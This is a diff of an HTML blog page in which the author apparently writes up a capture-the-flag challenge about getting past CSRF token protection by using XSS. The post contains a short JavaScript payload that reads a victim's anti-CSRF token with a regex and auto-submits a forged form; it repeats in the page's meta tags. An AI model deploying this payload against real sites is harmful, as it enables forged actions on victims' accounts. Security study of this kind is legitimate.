@@ -1,225 +1,295 @@
 <!DOCTYPE html>
 <html lang="en">
-
   <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Language" content="en">
+    
+      <title>CSRF Token Extraction :: Ajdin Trejić — Ajdin&#39;s blog about stuff</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
+&amp;lt;form action=&amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34; method=&amp;#34;post&amp;#34; name=&amp;#34;csrf&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;#34;token&amp;#34; type=&amp;#34;hidden&amp;#34; name=&amp;#34;token&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&amp;#39;token&amp;#39;).setAttribute(&amp;#39;value&amp;#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt; What is this token?"/>
+<meta name="keywords" content="Infosec, information security, cybersecurity, security, web development, webdev"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/csrf-bypass-token-with-xss/" />
 
-    <meta name="author" content="Ajdin Trejić">
-    <meta name="description" content="So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
-&lt;form action=&#34;&lt;url goes here&gt;&#34; method=&#34;post&#34; name=&#34;csrf&#34; enctype=&#34;multipart/form-data&#34;&gt; &lt;input ... /&gt; &lt;input id=&#34;token&#34; type=&#34;hidden&#34; name=&#34;token&#34; value=&#34;&#34; /&gt; &lt;button type=&#34;submit&#34;&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;script&gt; xhttp = new XMLHttpRequest(); xhttp.open(&#34;GET&#34;, &#34;&lt;url goes here&gt;&#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&#39;token&#39;).setAttribute(&#39;value&#39;, token_admin) document.csrf_form.submit(); &lt;/script&gt; What is this token?">
-    <meta name="keywords" content="blog,developer,personal,write-up">
 
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="CSRF :: Token Extraction"/>
-<meta name="twitter:description" content="So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
-&lt;form action=&#34;&lt;url goes here&gt;&#34; method=&#34;post&#34; name=&#34;csrf&#34; enctype=&#34;multipart/form-data&#34;&gt; &lt;input ... /&gt; &lt;input id=&#34;token&#34; type=&#34;hidden&#34; name=&#34;token&#34; value=&#34;&#34; /&gt; &lt;button type=&#34;submit&#34;&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;script&gt; xhttp = new XMLHttpRequest(); xhttp.open(&#34;GET&#34;, &#34;&lt;url goes here&gt;&#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&#39;token&#39;).setAttribute(&#39;value&#39;, token_admin) document.csrf_form.submit(); &lt;/script&gt; What is this token?"/>
 
-    <meta property="og:title" content="CSRF :: Token Extraction" />
-<meta property="og:description" content="So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
-&lt;form action=&#34;&lt;url goes here&gt;&#34; method=&#34;post&#34; name=&#34;csrf&#34; enctype=&#34;multipart/form-data&#34;&gt; &lt;input ... /&gt; &lt;input id=&#34;token&#34; type=&#34;hidden&#34; name=&#34;token&#34; value=&#34;&#34; /&gt; &lt;button type=&#34;submit&#34;&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;script&gt; xhttp = new XMLHttpRequest(); xhttp.open(&#34;GET&#34;, &#34;&lt;url goes here&gt;&#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&#39;token&#39;).setAttribute(&#39;value&#39;, token_admin) document.csrf_form.submit(); &lt;/script&gt; What is this token?" />
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.min.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSRF Token Extraction"/>
+<meta name="twitter:description" content="Extracting tokens from victim using XSS for fun."/>
+
+
+
+<meta property="og:title" content="CSRF Token Extraction" />
+<meta property="og:description" content="Extracting tokens from victim using XSS for fun." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ajdin.io/posts/csrf-bypass-token-with-xss/" />
+<meta property="og:url" content="/posts/csrf-bypass-token-with-xss/" />
 <meta property="article:published_time" content="2020-05-07T00:43:19+02:00" />
-<meta property="article:modified_time" content="2020-05-07T00:43:19+02:00" />
+<meta property="article:modified_time" content="2020-05-07T00:43:19+02:00" /><meta property="og:site_name" content="Ajdin Trejić" />
 
 
-    
-      <base href="https://ajdin.io/posts/csrf-bypass-token-with-xss/">
-    
-    <title>
-  CSRF :: Token Extraction · Ajdin.io
-</title>
 
-    
-      <link rel="canonical" href="https://ajdin.io/posts/csrf-bypass-token-with-xss/">
-    
 
-    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
 
-    
-      
-      
-      <link rel="stylesheet" href="https://ajdin.io/css/coder.min.4a28856a95e3501277551f73ab1c016dda3b5fd8733a791aedf596ee168b778e.css" integrity="sha256-SiiFapXjUBJ3VR9zqxwBbdo7X9hzOnka7fWW7haLd44=" crossorigin="anonymous" media="screen" />
-    
 
-    
 
-    
-      
-        
-        
-        <link rel="stylesheet" href="https://ajdin.io/css/coder-dark.min.329d0cb78d7aa737352ab5e9c025b96047573198980c0de02716d2def518e325.css" integrity="sha256-Mp0Mt416pzc1KrXpwCW5YEdXMZiYDA3gJxbS3vUY4yU=" crossorigin="anonymous" media="screen" />
-      
-    
 
-    
-      <link rel="stylesheet" href="https://ajdin.io/css/codeFix.css" />
-    
-
-    
-
-    <link rel="icon" type="image/png" href="https://ajdin.io/images/favicon-32x32.png" sizes="32x32">
-    <link rel="icon" type="image/png" href="https://ajdin.io/images/favicon-16x16.png" sizes="16x16">
-
-    <meta name="generator" content="Hugo 0.73.0" />
   </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
 
-  
-  
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
     
-  
-  <body class="colorscheme-dark">
-    <main class="wrapper">
-      <nav class="navigation">
-  <section class="container">
-    <a class="navigation-title" href="https://ajdin.io/">
-      Ajdin.io
-    </a>
-    
-    <input type="checkbox" id="menu-toggle" />
-    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
-    <ul class="navigation-list">
       
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdin.io/about/">About</a>
-          </li>
+          <li><a href="/about">About</a></li>
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdin.io/posts/">Blog</a>
-          </li>
+      
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdin.io/projects/">Projects</a>
-          </li>
+          <li><a href="/categories/hackthebox">HTB</a></li>
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdin.io/categories/hackthebox/">HTB</a>
-          </li>
+      
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdin.io/cv/">CV</a>
-          </li>
+          <li><a href="/cv">CV</a></li>
         
       
       
-    </ul>
     
-  </section>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/categories/hackthebox">HTB</a></li>
+      
+    
+      
+        <li><a href="/cv">CV</a></li>
+      
+    
+  </ul>
 </nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+<div class="padding">
+<div id="cookies-eu-banner" class="post" style="display: none;">
+    By continuing to visit this site, you accept the use of cookies for statistical purposes.
+    <a href="/privacy" id="cookies-eu-more">Read more</a>
+    
+	<div class="flex">
+    <button class="button" id="cookies-eu-accept">Accept</button>
+    </div>
+</div>
+</div>
 
 
       <div class="content">
         
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">CSRF :: Token Extraction</h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fas fa-calendar"></i>
-              <time datetime='2020-05-07T00:43:19&#43;02:00'>
-                May 7, 2020
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fas fa-clock"></i>
-              1-minute read
-            </span>
-          </div>
-        </div>
-      </header>
+  
+  
 
-      <div>
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/csrf-bypass-token-with-xss/">CSRF Token Extraction</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-05-07
+        </span>
+
+        
+          
+        
+      
+
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/csrf/">CSRF</a>&nbsp;
+        
+          #<a href="/tags/xss/">XSS</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+        
+          <img src="/csrf-bypass-token-with-xss/cover.jpg" alt="CSRF Token Extraction" />
         
 
-	
+        
+      </figure>
+    
 
+    <div class="post-content">
+      
+      <p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;url goes here&gt;&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span><span style="color:#f92672">&gt;</span>
+                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> ... <span style="color:#f92672">/&gt;</span>
+                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span>
+                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Submit</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/button&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/form&gt;</span>
 
-        <p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">&lt;form action=<span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span> method=<span style="color:#ed9d13">&#34;post&#34;</span> name=<span style="color:#ed9d13">&#34;csrf&#34;</span> enctype=<span style="color:#ed9d13">&#34;multipart/form-data&#34;</span>&gt;
-                &lt;input ... /&gt;
-                &lt;input id=<span style="color:#ed9d13">&#34;token&#34;</span> type=<span style="color:#ed9d13">&#34;hidden&#34;</span> name=<span style="color:#ed9d13">&#34;token&#34;</span> value=<span style="color:#ed9d13">&#34;&#34;</span> /&gt;
-                &lt;button type=<span style="color:#ed9d13">&#34;submit&#34;</span>&gt;Submit&lt;<span style="color:#a61717;background-color:#e3d2d2">/button&gt;</span>
-&lt;<span style="color:#a61717;background-color:#e3d2d2">/form&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+                <span style="color:#a6e22e">xhttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">xhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;&lt;url goes here&gt;&#34;</span>, <span style="color:#66d9ef">false</span>);
+                <span style="color:#a6e22e">xhttp</span>.<span style="color:#a6e22e">send</span>();
 
-&lt;script&gt;
-                xhttp = <span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest();
-                xhttp.open(<span style="color:#ed9d13">&#34;GET&#34;</span>, <span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
-                xhttp.send();
+                <span style="color:#a6e22e">token_admin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">xhttp</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/[abcdef0123456789]{32}/</span>));
 
-                token_admin = (xhttp.responseText.match(<span style="color:#ed9d13">/[abcdef0123456789]{32}/</span>));
+                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;token&#39;</span>).<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;value&#39;</span>, <span style="color:#a6e22e">token_admin</span>)
 
-                <span style="color:#24909d">document</span>.getElementById(<span style="color:#ed9d13">&#39;token&#39;</span>).setAttribute(<span style="color:#ed9d13">&#39;value&#39;</span>, token_admin)
-
-                <span style="color:#24909d">document</span>.csrf_form.submit();
-&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
+                document.<span style="color:#a6e22e">csrf_form</span>.<span style="color:#a6e22e">submit</span>();
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
 </code></pre></div><p>What is this token? Well one way to protect your site from CSRF attacks it to use tokens to validate if the request is being authentic, so we have to switch our token with victims token.</p>
 <p>The code is pretty easy to understand. This code inside the <code>&lt;script&gt;</code> tag is executed on our victims machine, and it loads a new <code>HTTP</code> request, finds the token using regular expressions and replaces it. Now our form has a valid token and we can submit it.</p>
 
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/htb-openadmin/">
+                  <span class="button__text">HackTheBox Openadmin Write Up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
       </div>
 
-
-      <footer>
-        
-
-
-        
-        
-        
-      </footer>
-    </article>
-
+      
+        <footer class="footer">
+  <div class="footer__inner">
     
-  </section>
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
 
+      <div class="copyright">
+
+        <span>© 2020  <a href="https://twitter.com/ajdintrejic" target="_blank" rel="noopener">Ajdin Trejić</a></span>
+        <span><a href="/privacy" target="_blank" rel="noopener">Privacy</a></span>
       </div>
-
-      
-  <footer class="footer">
-    <section class="container">
-      
-      
-        ©
-        
-          2019 -
-        
-        2020
-         Ajdin Trejić 
-      
-      
-      
-    </section>
-  </footer>
-
-    </main>
-
     
+  </div>
+</footer>
 
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-165836726-1', 'auto');
-	
-	ga('send', 'pageview');
-}
+
+
+
+
+<script src="/js/menu.js"></script>
+<script src="/js/theme.js"></script>
+<script src="/js/prism.js"></script>
+
+
+<script src="/cookies-eu-banner.js"></script>
+<script>
+    console.log("hello")
+    new CookiesEuBanner(function () {
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        
+        ga('create', 'UA-XXXXXXXX-X', 'auto');
+        ga('send', 'pageview');
+    });
 </script>
 
 
+
+
+
+      
+    </div>
+
     
-
   </body>
-
 </html>
